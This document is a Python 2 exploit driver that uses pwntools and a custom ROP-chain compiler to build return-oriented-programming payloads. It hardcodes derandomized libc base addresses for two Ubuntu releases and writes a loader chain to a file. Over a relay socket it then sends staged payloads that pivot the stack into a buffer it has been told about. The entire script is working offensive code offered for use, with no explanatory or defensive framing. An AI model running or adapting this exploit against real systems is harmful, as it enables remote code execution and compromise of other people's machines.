import pro

import struct
import pwn

def sockaddr(host, port, family=2):
    raw = struct.pack('<H', family) + struct.pack('>H', port) + ''.join(map(chr, map(int, host.split('.')))) + '\x00' * 8
    return '"' + raw.encode('string-escape') + '"'

class MyCodeGen(pro.CodeGenAmd64):
    def store_reg_mem(self, reg, addr):
        if reg == 'rax':
            store_rdx_rax = self.prog.env['store_rdx_rax']
            r = self.set_reg_imm('rdx', addr)
            r.append(store_rdx_rax)
            r.define |= {'rdx'}
            return r
        raise NotImplemented('store_reg_mem %s' % reg)

    def set_reg_imm(self, reg, imm):
        if reg == 'r9':
            if 'mov_r9_r14_call_rbx' in self.prog.env:
                mov_r9_r14_call_rbx = self.prog.env['mov_r9_r14_call_rbx']
                set_rbx = self.prog.env['set_rbx']
                return self.gen_call(pro.Call(mov_r9_r14_call_rbx, [imm, set_rbx]))
            elif 'mov_r9_r15_call_rbx' in self.prog.env:
                mov_r9_r15_call_rbx = self.prog.env['mov_r9_r15_call_rbx']
                set_rbx = self.prog.env['set_rbx']
                return self.gen_call(pro.Call(mov_r9_r15_call_rbx, [imm, set_rbx]))
        return super(MyCodeGen, self).set_reg_imm(reg, imm)

def compile(script):
    rendered = pro.process_file(script, path=['../common'], **globals())
    # print rendered
    prog = pro.parse(rendered)
    return MyCodeGen(prog)

if __name__ == '__main__':
    libc_base = 0x00002aaaaacd1000 # 15.10
    # libc_base = 0x00002aaaaacd3000 # 16.04
    reloc = {'libc':libc_base, '_CODE':0x602010} # derandomized

    LIBC_VERSION = '2.21'
    # LIBC_VERSION = '2.23'
    RELAY_HOST = '127.0.0.1'
    RELAY_HOST = '192.168.1.7'
    # RELAY_HOST = '192.168.98.1'
    RELAY_PORT = 12345
    listener = pwn.tubes.listen.listen(RELAY_PORT)

    with open('loader', 'w') as payload:
        chain = compile('loader.pro').gen_chain(reloc)
        payload.write(chain)

    # reserve for stack usage
    reserve = 0x400

    r = listener.wait_for_connection()
    d = r.recvline().strip()
    RELAY_FD = int(d.split(' ')[-1])
    print 'relay fd = %d' % RELAY_FD

    while True:
        pwn.context.log_level = 'DEBUG'
        try:
            r.recvuntil('START')
        except EOFError:
            break

        pwn.context.log_level = 'INFO'
        raw_input('GO')

        x = compile('main.pro')

        # calculate rop size in a dry run
        rop = x.gen_chain(reloc)
        ropsize = len(rop)
        ropsize += reserve
        print 'length of next rop = %#x' % ropsize

        r.send(struct.pack('<Q', ropsize))
        d = r.recvn(8)
        code = struct.unpack('<Q', d)[0]
        code += reserve
        print 'rop buffer = %#x' % code

        # generate final payload
        reloc['_CODE'] = code
        del reloc['_DATA']
        rop = x.gen_chain(reloc)
        head = x.flatten(x.set_reg('rsp', code), reloc)
        assert len(head) < reserve
        payload = head.ljust(reserve, '\x00') + rop
        assert len(payload) == ropsize

        r.send(payload)

